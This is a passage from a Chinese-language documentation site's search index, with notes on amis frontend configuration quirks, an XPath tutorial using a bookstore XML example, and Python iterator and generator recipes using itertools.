定义执行更新时候的数据: onEvent: {\n    confirm: {\n        actions: [\n            {\n                actionType: 'setValue',\n                componentId: \"top-form\",\n                args: {\n                    value: {\n                        eName: 'x${eName}'\n                    }\n                }\n            }\n        ]\n    }\n} 注意, 貌似只能更新某一条数据链上的内容 默认setValue会将新数据与目标组件数据进行合并;\n可以通过\"dataMergeMode\": \"override\"来覆盖目标组件数据; 除非是当前数据链上的数据, 否则需要指定额外的id去更新指定控件的数据","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Dialog-update-parent-component-data-domain.html","loc":"/yq-docs-front-end-frame-amis-question-Dialog-update-parent-component-data-domain.html"},{"title":"类disabled属性只能识别数据链对象","text":"比如有一个 checkbox 控件 name 为: com.app.enable {\n  \"type\": \"checkbox\",\n  \"name\": \"com.app.enable\"\n} 同时有一个相关的 input-text 控件的 disabledOn 属性与其相关联: {\n  \"type\": \"input-text\",\n  \"name\": \"com.app.version\"\n  \"disabledOn\": \"${!com.app.enable}\"\n} 表示只有 checkbox 选择的时候 text 才可用 但是因为属性是包含 . 的, 所以内部默认会识别为(数据块1): {\n  com: {\n    app: {\n      version: \"\",\n      enable: \"\",\n    }\n  }\n} 其中, 组件的 name 可以自动识别直接给的链式数据(数据块2): {\"com.app.enable\": false} 而组件的 disabledOn 只能识别解析后的数据, 也就是只能识别 (数据块1),\n效果就是, 当 disabledOn 包含点时候,\n第一次使用没问题,\n但是当数据域已有 (数据块2) 形式数据时, disabledOn 属性将失效 得将点替换为其它才能保证正常使用. 注解 这个问题触发的调教貌似比较苛刻, 目前只在使用 apiInit 的时候遇到过 还有一点, 好像是模版语法还是啥, 支持使用this, 比如有数据域: data: {\n  isOne: true\n} disabledOn支持直接设置为: disabledOn: \"!this.isOne\" 但是 数据域里不能这样用 , 比如: type: \"select\",\nsource: {\n  url: \"xxx/xxx/xxx?a=${a}\",\n  data: {\n    a: \"this.a\"\n  }\n}","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Disabled-attributes-can-only-identify-data-chain-objects.html","loc":"/yq-docs-front-end-frame-amis-question-Disabled-attributes-can-only-identify-data-chain-objects.html"},{"title":"disabledOn 表达式如果包含有 横杠 - 时会无效","text":"提出于 https://github.com/baidu/amis/issues/9673 原来是 - 会被当作 减号 , 需要转义处理: {\n    \"type\": \"checkbox\",\n    \"name\": \"_enableEnvAll-bob\",\n    \"label\": \"启用\",\n    // \"mode\": \"horizontal\",\n    style: {\n        justifyContent: 'center'\n    },\n},\n{\n    type: \"input-text\",\n    name: \"_enableEnvAll-bob\",\n    disabledOn: \"${!_enableEnvAll\\\\-bob}\",\n},","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Disabledon-expression-If-it-contains-horizontal-bar--it-will-be-invalid.html","loc":"/yq-docs-front-end-frame-amis-question-Disabledon-expression-If-it-contains-horizontal-bar--it-will-be-invalid.html"},{"title":"input-kv说明","text":"与 input-text说明 不一样, input-kv只能接受 JSON 数据","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Input-KV-description.html","loc":"/yq-docs-front-end-frame-amis-question-Input-KV-description.html"},{"title":"input-array使用","text":"必须有 item , 组件才知道怎么渲染: {\n  type: 'input-array',\n  items: {\n      type: 'input-text'\n  }\n} 如果是多个项作为一个组, 那么需要使用 combo : {\n  type: 'input-array',\n  items: {\n        type: 'combo',\n        controls: [\n            {\n                type: 'input-text',\n                name: 'va',\n                label: 'va',\n            },\n            {\n                type: 'input-text',\n                name: 'vb',\n                label: 'vb',\n            }\n        ]\n    }\n} 这时数据的定义: eaa: [\n    {va: 1, vb: 11},\n] 注解 如果在 input-array 内部定义了子组件, 那么在这里面得 componentId , componentName 可能只能调用到内部的组件,\n如果是外部组件多半就是找不到组件 列表长度交互 当列表数据大于等于1时, 禁止新增: {\n  type: 'input-array',\n  name: 'array1',\n  label: '长度: ${COUNT(array1)}',\n  addableOn: '${COUNT(array1) < 1}',\n  items: {...}\n} 注解 不知道为什么, 官网文档没有提到可以用 addableOn, 只写了 addable","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Input-Rray-use.html","loc":"/yq-docs-front-end-frame-amis-question-Input-Rray-use.html"},{"title":"input-text说明","text":"input-text接受的数据, 如果是JSON格式, 会自动转换为字符串展示,\n同时在此处所有的更改, 也会自动变换原来的JSON格式(前提是格式正确) 注解 但是, 估计也是text原因, 使用API提交的时候还是会是字符串形式, 坑","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Input-Text-description.html","loc":"/yq-docs-front-end-frame-amis-question-Input-Text-description.html"},{"title":"渲染界面无样式","text":"注意需要导入内置的CSS才有样式: import 'amis/lib/themes/cxd.css';\nimport 'amis/lib/helper.css';\nimport 'amis/sdk/iconfont.css';\n// 或 import 'amis/lib/themes/antd.css'; 如果是html, 这样引入: <link href=\"./node_modules/amis/lib/themes/cxd.css\" />\n<link href=\"./node_modules/amis/lib/helper.css\" />\n<link href=\"./node_modules/amis/sdk/iconfont.css\" />\n<!-- 或 <link href=\"./node_modules/amis/lib/themes/antd.css\" /> -->","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-No-style-of-rendering-interface.html","loc":"/yq-docs-front-end-frame-amis-question-No-style-of-rendering-interface.html"},{"title":"React使用","text":"除了用json, 在 React 环境下使用 amis，还可以直接引入 amis 内置组件，\n在 amis 项目源码 src/components 下的组件都是标准 React 组件，\n可以在项目中直接引用，这样就能将 amis 当成纯粹 UI 库来使用: import {Button} from 'amis-ui';\n\n...\n\n<Button\n  onClick={() => {}}\n  type=\"button\"\n  level=\"link\"\n  className=\"navbar-btn\"\n>\n  按钮\n</Button>","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-React.html","loc":"/yq-docs-front-end-frame-amis-question-React.html"},{"title":"设置其他组件的值","text":"最简单的, 直接使用 value 即可: {\n    type: \"input-text\",\n    name: \"input_v2\",\n},\n{\n    type: \"input-text\",\n    name: \"input_v\",\n    value: \"${input_v2}\"\n}, input_v2更新会自动更新input_v 或者用onChange只能这样写: {\n    type: \"input-text\",\n    name: \"input_v2\",\n    onEvent: {\n        change: {\n            actions: [\n                {\n                    actionType: \"setValue\",\n                    componentName: \"input_v\",\n                    args: {\n                        value: \"${input_v2}\"\n                    }\n                },\n            ]\n        }\n    }\n},","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Set-the-value-of-other-components.html","loc":"/yq-docs-front-end-frame-amis-question-Set-the-value-of-other-components.html"},{"title":"数据域的向上更新","text":"重点! 适用于当前数据链 主要对前面的不当做一个纠正, 这部分纠正有空再找出来改, 同一个页面的数据域, 向上向下的更新都是支持的,\n.. 不过复杂情况下, 默认仅能保持两层, 可以使用 trackExpression 来确定跟踪的字段; 不同页面的, 比如弹出一个dialog, 相当于是一个新的页面, data 应当是被拷贝了一份,\ndialog数据的变化无法影响到上一层 dialog父级组件的数据可以向下传递 , 但是dialog父级组件的兄弟组件不行.","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Upper-update-of-data-domain.html","loc":"/yq-docs-front-end-frame-amis-question-Upper-update-of-data-domain.html"},{"title":"validations验证信息配置无效","text":"有时候表单信息需要配置字段验证 只有在Form表单中才能验证字段 , 因为只有它才有提交功能,\n验证一般只有提交或者活触发自动提交的时候才会触发;\n成功触发一次后, 看效果后续都是此字段自动立刻校验了 例: {\n    type: 'form',\n    body: {\n        type: 'input-text',\n        name: 'eName',\n        label: 'label0',\n        mode: \"horizontal\",\n        validations: {\n            \"isNumeric\": true,\n            \"minimum\": 10,          // 表示数字最小为10\n        },\n        // description: \"请输入数字类型文本\",\n        validationErrors: {\n            \"isNumeric\": '不是数字',\n            \"minimum\": \"同学，最少输入$1以上的数字哈\"\n        }\n    },\n    xs: 11\n},","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Validations-verification-information-configuration-is-invalid.html","loc":"/yq-docs-front-end-frame-amis-question-Validations-verification-information-configuration-is-invalid.html"},{"title":"变量使用","text":"若变量名不存在特殊字符时, 可以直接使用: $varName 若存在特殊字符或者下划线或者表达式等, 需要括起来才能正常识别位数据域数据: ${varName} 所以一般建议统一加上花括号 另外对于表达式而言, 不加花括号是旧版直接用js,\n可参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/expression github也有相关问题 https://github.com/baidu/amis/issues/9629","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Variable-use.html","loc":"/yq-docs-front-end-frame-amis-question-Variable-use.html"},{"title":"componentName无效","text":"继续上一节 combo无法指定更新某一个 ,\n若当前项的 name 包含 . , 那么可能会把它做错数据来解析(链式调用),\n导致 componentName 无法正确指向想要的属性. 所以, 控件 name 命名尽量不要使用 .","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-componentname-invalid.html","loc":"/yq-docs-front-end-frame-amis-question-componentname-invalid.html"},{"title":"实例","text":"我们将在下面的例子中使用这个 XML 文档：\n\"books.xml\": <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<bookstore>\n\n<book category=\"COOKING\">\n  <title lang=\"en\">Everyday Italian</title>\n  <author>Giada De Laurentiis</author>\n  <year>2005</year>\n  <price>30.00</price>\n</book>\n\n<book category=\"CHILDREN\">\n  <title lang=\"en\">Harry Potter</title>\n  <author>J K. Rowling</author>\n  <year>2005</year>\n  <price>29.99</price>\n</book>\n\n<book category=\"WEB\">\n  <title lang=\"en\">XQuery Kick Start</title>\n  <author>James McGovern</author>\n  <author>Per Bothner</author>\n  <author>Kurt Cagle</author>\n  <author>James Linn</author>\n  <author>Vaidyanathan Nagarajan</author>\n  <year>2003</year>\n  <price>49.99</price>\n</book>\n\n<book category=\"WEB\">\n  <title lang=\"en\">Learning XML</title>\n  <author>Erik T. Ray</author>\n  <year>2003</year>\n  <price>39.95</price>\n</book>\n\n</bookstore> 加载 XML 文档 所有现代浏览器都支持使用 XMLHttpRequest 来加载 XML 文档的方法。\n针对大多数现代浏览器的代码: var xmlhttp=new XMLHttpRequest() 针对古老的微软浏览器（IE 5 和 6）的代码: var xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\") 选取节点 不幸的是，Internet Explorer 和其他处理 XPath 的方式不同。\n在我们的例子中，包含适用于大多数主流浏览器的代码。\nInternet Explorer 使用 selectNodes() 方法从 XML 文档中的选取节点: xmlDoc.selectNodes(xpath); Firefox、Chrome、Opera 以及 Safari 使用 evaluate() 方法从 XML 文档中选取节点: xmlDoc.evaluate(xpath, xmlDoc, null, XPathResult.ANY_TYPE,null); 选取所有 title 下面的例子选取所有 title 节点: /bookstore/book/title 选取第一个 book 的 title 下面的例子选取 bookstore 元素下面的第一个 book 节点的 title: /bookstore/book[1]/title 这里有一个问题。上面的例子在 IE 和其他浏览器中输出不同的结果。\nIE5 以及更高版本将 [0] 视为第一个节点，而根据 W3C 的标准，应该是 [1]。 一种解决方法！ 为了解决 IE5+ 中 [0] 和 [1] 的问题，可以为 XPath 设置语言选择（SelectionLanguage）。\n下面的例子选取 bookstore 元素下面的第一个 book 节点的 title: xml.setProperty(\"SelectionLanguage\",\"XPath\");\nxml.selectNodes(\"/bookstore/book[1]/title\"); 选取所有价格 下面的例子选取 price 节点中的所有文本: /bookstore/book/price/text() 选取价格高于 35 的 price 节点 下面的例子选取价格高于 35 的所有 price 节点: /bookstore/book[price>35]/price 选取价格高于 35 的 title 节点 下面的例子选取价格高于 35 的所有 title 节点: /bookstore/book[price>35]/title","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-XPath-Instance.html","loc":"/yq-docs-rear-end-python-Tutorial-XPath-Instance.html"},{"title":"XPath语法","text":"XPath 使用路径表达式来选取 XML 文档中的节点或节点集。节点是通过沿着路径 (path) 或者步 (steps) 来选取的。 XML 实例文档 我们将在下面的例子中使用这个 XML 文档: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<bookstore>\n\n<book>\n  <title lang=\"eng\">Harry Potter</title>\n  <price>29.99</price>\n</book>\n\n<book>\n  <title lang=\"eng\">Learning XML</title>\n  <price>39.95</price>\n</book>\n\n</bookstore> 选取节点 XPath 使用路径表达式在 XML 文档中选取节点。节点是通过沿着路径或者 step 来选取的。\n下面列出了最有用的路径表达式： 表达式 描述 nodename 选取此节点的所有子节点。 / 从根节点选取（取子节点）。 用于开头表示绝对路径 // 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置（取子孙节点）。\n用于开头表示绝对路径 . 选取当前节点。 .. 选取当前节点的父节点。 @ 选取属性。 在下面的表格中，我们已列出了一些路径表达式以及表达式的结果 路径表达式 结果 bookstore 选取 bookstore 元素的所有子节点 /bookstore 选取根元素 bookstore 注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！ bookstore/book 选取属于 bookstore 的子元素的所有 book 元素 //book 选取所有 book 子元素，而不管它们在文档中的位置 bookstore//book 选择属于 bookstore 元素的后代的所有 book 元素,\n而不管它们位于 bookstore 之下的什么位置 //@lang 选取名为 lang 的所有属性 谓语（Predicates） 谓语用来查找某个特定的节点或者包含某个指定的值的节点。 谓语被嵌在方括号中。 在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果： 路径表达式 结果 /bookstore/book[1] 选取属于 bookstore 子元素的第一个 book 元素。 /bookstore/book[last()] 选取属于 bookstore 子元素的最后一个 book 元素。 /bookstore/book[last()-1] 选取属于 bookstore 子元素的倒数第二个 book 元素。 /bookstore/book[position()<3] 选取最前面的两个属于 bookstore 元素的子元素的 book 元素。 //title[@lang] 选取所有拥有名为 lang 的属性的 title 元素。 //title[@lang='eng'] 选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。 /bookstore/book[price>35.00] 选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。 /bookstore/book[price>35.00]//title 选取 bookstore 元素中的 book 元素的所有 title 元素，\n且其中的 price 元素的值须大于 35.00。 选取未知节点 XPath 通配符可用来选取未知的 XML 元素。\n==========    ===========================\n通配符             描述\n==========    =========================== * 匹配任何元素节点。 @* 匹配任何属性节点。\nnode()          匹配任何类型的节点。\n==========    =========================== 在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果： 路径表达式 结果 /bookstore/* 选取 bookstore 元素的所有子元素。 //* 选取文档中的所有元素。 //title[@*] 选取所有带有属性的 title 元素。 选取若干路径 通过在路径表达式中使用\"|\"运算符，您可以选取若干个路径。 在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果： 路径表达式 结果 //book/title | //book/price 选取 book 元素的所有 title 和 price 元素 //title | //price 选取文档中的所有 title 和 price 元素 /bookstore/book/title | //price 选取属于 bookstore 元素的 book 元素的所有 title 元素,\n以及文档中所有的 price 元素","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-XPath-XPath-grammar.html","loc":"/yq-docs-rear-end-python-Tutorial-XPath-XPath-grammar.html"},{"title":"XPath节点","text":"XPath 术语 节点 在 XPath 中，有七种类型的节点： 元素 属性 文本 命名空间 处理指令 注释 文档（根）节点 XML 文档是被作为节点树来对待的。树的根被称为文档节点或者根节点。 请看下面这个 XML 文档: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<bookstore>\n  <book>\n    <title lang=\"en\">Harry Potter</title>\n    <author>J K. Rowling</author>\n    <year>2005</year>\n    <price>29.99</price>\n  </book>\n</bookstore> 上面的XML文档中的节点例子: <bookstore> (文档节点)\n\n<author>J K. Rowling</author> (元素节点)\n\nlang=\"en\" (属性节点) 基本值（或称原子值，Atomic value） 基本值是无父或无子的节点。 基本值的例子: J K. Rowling\n\n\"en\" 项目（Item） 项目是基本值或者节点。 节点关系 父（Parent） 每个元素以及属性都有一个父。 在下面的例子中，book 元素是 title、author、year 以及 price 元素的父: <book>\n  <title>Harry Potter</title>\n  <author>J K. Rowling</author>\n  <year>2005</year>\n  <price>29.99</price>\n</book> 子（Children） 元素节点可有零个、一个或多个子。 在下面的例子中，title、author、year 以及 price 元素都是 book 元素的子: <book>\n  <title>Harry Potter</title>\n  <author>J K. Rowling</author>\n  <year>2005</year>\n  <price>29.99</price>\n</book> 同胞（Sibling） 拥有相同的父的节点 在下面的例子中，title、author、year 以及 price 元素都是同胞: <book>\n  <title>Harry Potter</title>\n  <author>J K. Rowling</author>\n  <year>2005</year>\n  <price>29.99</price>\n</book> 先辈（Ancestor） 某节点的父、父的父，等等。 在下面的例子中，title 元素的先辈是 book 元素和 bookstore 元素: <bookstore>\n\n<book>\n  <title>Harry Potter</title>\n  <author>J K. Rowling</author>\n  <year>2005</year>\n  <price>29.99</price>\n</book>\n\n</bookstore> 后代（Descendant） 某个节点的子，子的子，等等。 在下面的例子中，bookstore 的后代是 book、title、author、year 以及 price 元素: <bookstore>\n\n<book>\n  <title>Harry Potter</title>\n  <author>J K. Rowling</author>\n  <year>2005</year>\n  <price>29.99</price>\n</book>\n\n</bookstore>","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-XPath-XPath-node.html","loc":"/yq-docs-rear-end-python-Tutorial-XPath-XPath-node.html"},{"title":"XPath 轴（Axes）","text":"XML 实例文档 我们将在下面的例子中使用此 XML 文档: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<bookstore>\n\n<book>\n  <title lang=\"en\">Harry Potter</title>\n  <price>29.99</price>\n</book>\n\n<book>\n  <title lang=\"en\">Learning XML</title>\n  <price>39.95</price>\n</book>\n\n</bookstore> 轴可定义相对于当前节点的节点集。 轴名称 结果 ancestor 选取当前节点的所有先辈（父、祖父等）。 ancestor-or-self 选取当前节点的所有先辈（父、祖父等）以及当前节点本身。 attribute 选取当前节点的所有属性。 child 选取当前节点的所有子元素。 descendant 选取当前节点的所有后代元素（子、孙等）。 descendant-or-self 选取当前节点的所有后代元素（子、孙等）以及当前节点本身。 following 选取文档中当前节点的结束标签之后的所有节点。 following-sibling 选取当前节点之后的所有兄弟节点 namespace 选取当前节点的所有命名空间节点。 parent 选取当前节点的父节点。 preceding 选取文档中当前节点的开始标签之前的所有节点。 preceding-sibling 选取当前节点之前的所有同级节点。 self 选取当前节点。","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-XPath-XPath-shaft.html","loc":"/yq-docs-rear-end-python-Tutorial-XPath-XPath-shaft.html"},{"title":"迭代器/生成器","text":"手动遍历迭代器 使用 next() 函数并在代码中捕获 StopIteration 异 常: def manual_iter():\n  with open('/etc/passwd') as f:\n    try:\n      while True:\n        line = next(f)\n        print(line, end='')\n    except StopIteration:\n      pass 通常来讲，StopIteration 用来指示迭代的结尾。\n然而，还可以通过返回一个指定值来标记结尾，比如 None 。下面是 示例: with open('/etc/passwd') as f:\n  while True:\n    line = next(f, None)\n    if line is None:\n      break\n    print(line, end='') 大多数情况下，我们会使用 for 循环语句用来遍历一个可迭代对象。\n但是，偶尔也 需要对迭代做更加精确的控制，这时候了解底层迭代机制就显得尤为重要了: >>> items = [1, 2, 3]\n>>> # Get the iterator\n>>> it = iter(items) # Invokes items.__iter__()\n>>> # Run the iterator\n>>> next(it) # Invokes it.__next__()\n1\n>>> next(it)\n2\n>>> next(it)\n3\n>>> next(it)\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module> StopIteration\n>>> 代理迭代 你构建了一个自定义容器对象，里面包含有列表、元组或其他可迭代对象。你想直 接在你的这个新容器对象上执行迭代操作 实际上你只需要定义一个 __iter__() 方法，将迭代操作代理到容器内部的对象上 去。比如: class Node:\n  def __init__(self, value):\n    self._value = value\n    self._children = []\n  def __repr__(self):\n    return 'Node({!r})'.format(self._value)\n\n  def add_child(self, node):\n    self._children.append(node)\n\n  def __iter__(self):\n    return iter(self._children) Python 的迭代器协议需要 __iter__() 方法返回一个实现了 __next__() 方法的 迭代器对象。\n如果你只是迭代遍历其他容器的内容，你无须担心底层是怎样实现的。你 所要做的只是传递迭代请求既可。 这里的 iter() 函数的使用简化了代码，iter(s) 只是简单的通过调用 s. __iter__() 方法来返回对应的迭代器对象，\n就跟 len(s) 会调用 s.__len__() 原理 是一样的。 使用生成器创建新的迭代模式 你想实现一个自定义迭代模式，跟普通的内置函数比如 range() , reversed() 不 一样: def frange(start, stop, increment):\n  x = start\n  while x < stop:\n    yield x\n    x += increment 一个函数中需要有一个 yield 语句即可将其转换为一个生成器。跟普通函数不同 的是，生成器只能用于迭代操作。 一个生成器函数主要特征是它只会回应在迭代中使用到的 next 操作。一旦生成器 函数返回退出，迭代终止。\n我们在迭代中通常使用的 for 语句会自动处理这些细节，所 以你无需担心。 实现迭代器协议 构建一个能支持迭代操作的自定义对象，并希望找到一个能实现迭代协议的 简单方法。 目前为止，在一个对象上实现迭代最简单的方式是使用一个生成器函数.\n你可能想实现一个以深度优先方式遍历树形 节点的生成器。下面是代码示例: class Node:\n  def __init__(self, value):\n        self._value = value\n        self._children = []\n\n  def __repr__(self):\n    return 'Node({!r})'.format(self._value)\n\n  def add_child(self, node):\n    self._children.append(node)\n\n  def __iter__(self):\n    return iter(self._children)\n\n  def depth_first(self):\n    yield self\n    for c in self:\n      yield from c.depth_first() 反向迭代 反方向迭代一个序列 使用内置的 reversed() 函数: >>> a = [1, 2, 3, 4]\n>>> for x in reversed(a):\n...   print(x)\n...\n4\n3\n2\n1 反向迭代仅仅当对象的大小可预先确定或者对象实现了 __reversed__() 的特殊 方法时才能生效。\n如果两者都不符合，那你必须先将对象转换为一个列表才行: # Print a file backwards\nf = open('somefile')\nfor line in reversed(list(f)):\n  print(line, end='') 要注意的是如果可迭代对象元素很多的话，将其预先转换为一个列表要消耗大量 的内存 很多程序员并不知道可以通过在自定义类上实现 __reversed__() 方法来实现反 向迭代。比如: class Countdown:\n  def __init__(self, start):\n    self.start = start\n\n  # Forward iterator\n  def __iter__(self):\n    n = self.start\n    while n > 0:\n      yield n\n      n -= 1\n\n  # Reverse iterator\n  def __reversed__(self):\n    n=1\n    while n <= self.start:\n      yield n\n      n += 1 定义一个反向迭代器可以使得代码非常的高效，因为它不再需要将数据填充到一 个列表中然后再去反向迭代这个列表: from collections import deque\n\nclass linehistory:\n  def __init__(self, lines, histlen=3):\n    self.lines = lines\n    self.history = deque(maxlen=histlen)\n\n  def __iter__(self):\n    for lineno, line in enumerate(self.lines, 1):\n      self.history.append((lineno, line))\n      yield line\n\n  def clear(self): self.history.clear() 带有外部状态的生成器函数 定义一个生成器函数，但是它会调用某个你想暴露给用户使用的外部状态值 如果你想让你的生成器暴露外部状态给用户，别忘了你可以简单的将它实现为一 个类，然后把生成器函数放到 __iter__() 方法中过去 迭代器切片 你想得到一个由迭代器生成的切片对象，但是标准切片操作并不能做到。 函数 itertools.islice() 正好适用于在迭代器和生成器上做切片操作。比如: >>> def count(n):\n...  while True:\n...    yield n\n...    n += 1\n...\n>>> c = count(0)\n>>> c[10:20]\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module> TypeError: 'generator' object is not subscriptable\n>>> # Now using islice()\n>>> import itertools\n>>> for x in itertools.islice(c, 10, 20): ... print(x)\n...\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n>>> 迭代器和生成器不能使用标准的切片操作，因为它们的长度事先我们并不知道 (并 且也没有实现索引)。\n函数 islice() 返回一个可以生成指定元素的迭代器，它通过遍 历并丢弃直到切片开始索引位置的所有元素。\n然后才开始一个个的返回元素，并直到切 片结束索引位置。 这里要着重强调的一点是 islice() 会消耗掉传入的迭代器中的数据。\n必须考虑到 迭代器是不可逆的这个事实。所以如果你需要之后再次访问这个迭代器的话，那你就得 先将它里面的数据放入一个列表中。 跳过可迭代对象的开始部分 你想遍历一个可迭代对象，但是它开始的某些元素你并不感兴趣，想跳过它们。 itertools 模块中有一些函数可以完成这个任务。首先介绍的是 itertools. dropwhile() 函数。\n使用时，你给它传递一个函数对象和一个可迭代对象。\n它会返 回一个迭代器对象，丢弃原有序列中直到函数返回 Flase 之前的所有元素，然后返回后 面所有元素。 如果你想跳过开始部分的注释行的话，可以这样做: >>> from itertools import dropwhile\n>>> with open('/etc/passwd') as f:\n...   for line in dropwhile(lambda line: line.startswith('#'), f):\n...     print(line, end='')\n...\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\n...\n>>> 这个例子是基于根据某个测试函数跳过开始的元素。\n如果你已经明确知道了要跳 过的元素的个数的话，那么可以使用 itertools.islice() 来代替。比如: >>> from itertools import islice\n>>> items = ['a', 'b', 'c', 1, 4, 10, 15]\n>>> for x in islice(items, 3, None):\n...   print(x)\n...\n1\n4\n10\n15 islice() 函数最后那个 None 参数指定了你要获取从第 3 个到最 后的所有元素，\n如果 None 和 3 的位置对调，意思就是仅仅获取前三个元素恰恰相反， (这个跟切片的相反操作 [3:] 和 [:3] 原理是一样的)。 排列组合的迭代 你想迭代遍历一个集合中元素的所有可能的排列或组合, 即 全排列 问题. itertools 模块提供了三个函数来解决这类问题。\n其中一个是 itertools.permutations() ，它接受一个集合并产生一个元组序列，每个元组由集合中所有 元素的一个可能排列组成。\n也就是说通过打乱集合中元素排列顺序生成一个元组，比 如: >>> items = ['a', 'b', 'c']\n>>> from itertools import permutations\n>>> for p in permutations(items):\n...   print(p)\n...\n('a', 'b', 'c')\n('a', 'c', 'b')\n('b', 'a', 'c')\n('b', 'c', 'a')\n('c', 'a', 'b')\n('c', 'b', 'a')\n>>> 如果你想得到指定长度的所有排列，你可以传递一个可选的长度参数。就像这样: >>> for p in permutations(items, 2):\n...   print(p)\n...\n('a', 'b')\n('a', 'c')\n('b', 'a')\n('b', 'c')\n('c', 'a')\n('c', 'b')\n>>> 使用 itertools.combinations() 可得到输入集合中元素的所有的组合。比如: >>> from itertools import combinations\n>>> for c in combinations(items, 3):\n...   print(c)\n...\n('a', 'b', 'c')\n>>> for c in combinations(items, 2):\n...   print(c)\n...\n('a', 'b')\n('a', 'c')\n('b', 'c')\n\n>>> for c in combinations(items, 1):\n...   print(c)\n...\n('a',)\n('b',)\n('c',)\n>>> 对于 combinations() 来讲，元素的顺序已经不重要了。\n也就是说，组合 ('a', 'b') 跟 ('b', 'a') 其实是一样的 (最终只会输出其中一个)。 在计算组合的时候，一旦元素被选取就会从候选中剔除掉 (比如如果元 素'a'已经被选取了，那么接下来就不会再考虑它了)。\n而函数 itertools. combinations_with_replacement() 允许同一个元素被选择多次，比如: >>> for c in combinations_with_replacement(items, 3):\n...   print(c)\n...\n('a', 'a', 'a')\n('a', 'a', 'b')\n('a', 'a', 'c')\n('a', 'b', 'b')\n('a', 'b', 'c')\n('a', 'c', 'c')\n('b', 'b', 'b')\n('b', 'b', 'c')\n('b', 'c', 'c')\n('c', 'c', 'c')\n>>> 当我们碰到看上去有些复杂的迭 代问题时，最好可以先去看看 itertools 模块。\n如果这个问题很普遍，那么很有可能会在 里面找到解决方案! 序列上索引值迭代 你想在迭代一个序列的同时跟踪正在被处理的元素索引。 内置的 enumerate() 函数可以很好的解决这个问题, enumerate 接受一个参数作为起始序号, 默认为0: >>> my_list = ['a', 'b', 'c']\n>>> for idx, val in enumerate(my_list, 1):\n...   print(idx, val)\n...\n1a\n2b\n3c enumerate() 函数返回的是一个 enumerate 对象实例，它是一个迭代器，返回连 续的包含一个计数和一个值的元组，\n元组中的值通过在传入序列上调用 next() 返回。 还有一点可能并不很重要，但是也值得注意，有时候当你在一个已经解压后的元组 序列上使用 enumerate() 函数时很容易调入陷阱。\n你得像下面正确的方式这样写: data = [ (1, 2), (3, 4), (5, 6), (7, 8) ]\n\n# Correct!\nfor n, (x, y) in enumerate(data): ...\n\n# Error!\nfor n, x, y in enumerate(data): ... 同时迭代多个序列 你想同时迭代多个序列，每次分别从一个序列中取一个元素。 使用 zip() 函数: >>> xpts = [1, 5, 4, 2, 10, 7]\n>>> ypts = [101, 78, 37, 15, 62, 99]\n>>> for x, y in zip(xpts, ypts):\n...   print(x,y)\n...\n1 101\n5 78\n4 37\n2 15\n10 62\n7 99\n>>> zip(a, b) 会生成一个可返回元组 (x, y) 的迭代器，其中 x 来自 a，y 来自 b。\n一 旦其中某个序列到底结尾，迭代宣告结束。因此迭代长度跟参数中最短序列长度一致。 如果这个不是你想要的效果，那么还可以使用 itertools.zip_longest() 函数来 代替: >>> from itertools import zip_longest\n>>> for i in zip_longest(a,b):\n...   print(i)\n...\n(1, 'w')\n(2, 'x')\n(3, 'y')\n(None, 'z')\n>>> for i in zip_longest(a, b, fillvalue=0):\n...   print(i)\n...\n(1, 'w')\n(2, 'x')\n(3, 'y')\n(0, 'z')\n>>> 不同集合上元素的迭代 你想在多个对象执行相同的操作，但是这些对象在不同的容器中，你希望代码在不 失可读性的情况下避免写重复的循环。 itertools.chain() 方法可以用来简化这个任务。\n它接受一个可迭代对象列表作 为输入，并返回一个迭代器，有效的屏蔽掉在多个容器中迭代细节。\n为了演示清楚，考 虑下面这个例子: >>> from itertools import chain\n>>> a = [1, 2, 3, 4]\n>>> b = ['x', 'y', 'z']\n>>> for x in chain(a, b):\n...   print(x)\n...\n1\n2\n3 4 x y z\n>>> tertools.chain() 接受一个或多个可迭代对象最为输入参数。\n然后创建一个迭 代器，依次连续的返回每个可迭代对象中的元素。\n这种方式要比先将序列合并再迭代要 高效的多。 创建数据处理管道 以数据管道 (类似 Unix 管道) 的方式迭代处理数据。比如，你有个大量的数据 需要处理，但是不能将它们一次性放入内存中。 生成器函数是一个实现管道机制的好办法 函数内使用 yield 作为生产者, 外部 for 作为 消费者, 来组成处理管道. 展开嵌套的序列 你想将一个多层嵌套的序列展开成一个单层列表 yield from 在你想在生成器中调用其他生成器作为子例程的时候非常有用 顺序迭代合并后的排序迭代对象 有一系列排序序列，想将它们合并后得到一个排序序列并在上面迭代遍历。 heapq.merge() 函数: >>> import heapq\n>>> a = [1, 4, 7, 10]\n>>> b = [2, 5, 6, 11]\n>>> for c in heapq.merge(a, b):\n...   